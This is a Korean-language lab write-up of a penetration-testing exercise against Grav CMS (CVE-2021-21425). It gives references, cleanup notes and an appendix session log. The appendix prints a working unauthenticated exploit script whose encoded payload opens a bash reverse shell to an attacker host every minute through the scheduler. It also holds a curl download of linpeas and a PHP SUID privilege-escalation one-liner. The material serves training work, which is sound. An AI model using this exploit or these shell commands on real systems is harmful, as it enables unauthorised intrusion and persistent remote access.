
---

## 9. 참고 자료

- **CVE-2021-21425** — Grav Admin Plugin, Unauthenticated Arbitrary YAML Write/Update (≤ 1.10.7)
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21425
  - GHSA (Grav 저장소 보안 권고): `grav-plugin-admin` ≤1.10.7 → **1.10.8에서 수정**
- exploit-db `49973.py` — GravCMS 1.10.7 Arbitrary YAML Write/Update (**수동 스크립트, 시험 허용**)
- exploit-db `49788.rb` — Metasploit 모듈 (**시험 1대 제한에 소모됨**). 영향 범위 확인용으로 **읽는 것은 제한 없음**
- exploit-db `49961.py` — Grav CMS 1.7.10 SSTI (이 타겟은 1.7.8이라 미해당, 다른 표면으로 기억할 것)
- GTFOBins `php`: https://gtfobins.github.io/gtfobins/php/#suid
- Grav 문서 — Scheduler: `bin/grav scheduler` 를 시스템 crontab에 등록하는 것이 **공식 설치 절차**다. 즉 이 전제는 대부분의 Grav 설치에 존재한다
- `sh(1)` / `bash(1)` — `-p` (privileged mode): euid ≠ uid일 때 특권 드롭을 억제

## 남긴 흔적 (랩 정리용)

익스플로잇이 `user/config/scheduler.yaml`에 **1분마다 리버스셸을 재발사하는 잡**을 심었다. 셸 확보 후 원본 백업(`scheduler.yaml.bak-exploit`)을 남기고 잡을 비활성화(`custom_jobs: {}` / `status: {}`)했다.
시스템 crontab은 박스 원래 구성이라 건드리지 않았다. 타겟에 `/tmp/rev.sh`가 남아 있다. 랩 Stop/Revert 시 전부 소멸.

> [!warning] 재발사 잡을 방치하면 안 되는 이유
> `at: '* * * * *'` 잡은 **셸이 끊겨도 1분 뒤 다시 붙는다.** 편리해 보이지만 문제가 둘이다.
> ① 리스너를 끄면 매분 실패한 커넥션이 쌓이고 로그가 요란해진다 — **탐지 표면**
> ② 실전 평가에서는 **명시적으로 제거해야 하는 지속성 아티팩트**다. OSCP 보고서에도 "심은 것과 제거한 것"을 적는다
> 셸을 안정화한 직후 **먼저 잡을 끄고**, 필요하면 SSH 키 등 통제 가능한 접근 수단으로 갈아탄다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Crane]] · [[RubyDome]] · [[Exghost]] · [[Hawat]] — **"응답이 성공을 뜻하지 않는다"** 누적 패턴
- [[Exfiltrated]] · [[Muddy]] — **크론 기반 권한상승/지연 실행**
- [[Hub]] · [[Levram]] · [[RubyDome]] — **버전 판정은 독립 근거 2개 이상**
- [[Hawat]] · [[Squid]] · [[Exfiltrated]] — **인용 중첩을 hex/base64로 회피**
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] — 같은 컬렉션 앞 박스
- [[01. Pentest Foundations]] — Astronaut 항목

---

## 부록 A — 이전 세션 기록 (2026-06-15, 다른 랩 인스턴스)


> [!note] 이 절은 원본 노트의 보존본이다
> 이 박스를 **2026-06-15에 한 번 풀었던 기록**이다(타겟 IP `192.168.115.12`, 당시 상태 `unsolved (당시 미완)`).
> 랩이 재기동되면 IP·타임스탬프·업로드 경로가 바뀌므로 본문(최신 세션)과 값이 다르다.
> **같은 박스를 다른 시점에 두 번 푼 기록이라 대조 자료로 가치가 있다** — 특히 랩 인스턴스마다 무엇이 바뀌고 무엇이 그대로인지 확인할 수 있다.

Nmap
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jun 15 13:10:06 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.115.12
Nmap scan report for 192.168.115.12
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.79 ms 192.168.45.1
2   66.71 ms 192.168.45.254
3   66.89 ms 192.168.251.1
4   67.02 ms 192.168.115.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 13:10:32 2026 -- 1 IP address (1 host up) scanned in 25.84 seconds
```



`/grav-admin/admin` 주소 획득
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.115.12/grav-admin
 🚩  In-Scope Url          │ 192.168.115.12
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      138l      931w    15508c http://192.168.115.12/grav-admin/admin
200      GET      159l     1203w    14014c http://192.168.115.12/grav-admin/home
[####################] - 7m     66153/66153   0s      found:2       errors:28464
[####################] - 2m      4614/4614    37/s    http://192.168.115.12/grav-admin/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/assets/
[####################] - 3m      4614/4614    31/s    http://192.168.115.12/grav-admin/backup/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/bin/
[####################] - 3m      4614/4614    30/s    http://192.168.115.12/grav-admin/cache/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/images/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/logs/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/system/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/tmp/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/system/images/
[####################] - 2m      4614/4614    32/s    http://192.168.115.12/grav-admin/system/pages/
[####################] - 2m      4614/4614    33/s    http://192.168.115.12/grav-admin/system/templates/
[####################] - 2m      4614/4614    34/s    http://192.168.115.12/grav-admin/system/images/media/
[####################] - 2m      4614/4614    42/s    http://192.168.115.12/grav-admin/system/templates/flex/                                      
```


로그인 페이지 확인
![[Pasted image 20260615132932.png]]


exploit 검색
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit grav
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
BitDefender GravityZone 5.1.5.386 - Multiple Vulnerabilities        | linux/webapps/34086.txt
Cobian Backup 11 Gravity 11.2.0.582 - 'Password' Denial of Service  | windows/local/50790.py
Cobian Backup Gravity 11.2.0.582 - 'CobianBackup11' Unquoted Servic | windows/local/50791.txt
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                  | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authentica | php/webapps/49961.py
Grav CMS 1.7.48 - Remote Code Execution (RCE)                       | php/webapps/52402.txt
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)  | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)  | php/webapps/49788.rb
```
![[Pasted image 20260615134012.png]]

exploit 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit -m 49973
  Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
      URL: https://www.exploit-db.com/exploits/49973
     Path: /usr/share/exploitdb/exploits/php/webapps/49973.py
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (429)
Copied to: /home/kali/PG/Astronaut/49973.py
```

targetIP, payload 수정 **실제 주소가 http://192.168.115.12/grav-admin 이므로 이걸로 수정해야 함**
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat 49973.py
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.115.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```

자격증명 획득
![[Pasted image 20260615140619.png]]


```bash
#발신
python -m http.server 80
#수신
curl -O http://192.168.45.179/linpeas.sh
```


crontab 확인
```bash
www-data@gravity:~/html$ crontab -l
crontab -l
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
```

https://gtfobins.org/gtfobins/php/#suid
```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```
![[Pasted image 20260615153618.png]]

자격증명 획득 후 flag  획득

![[Pasted image 20260615153700.png]]
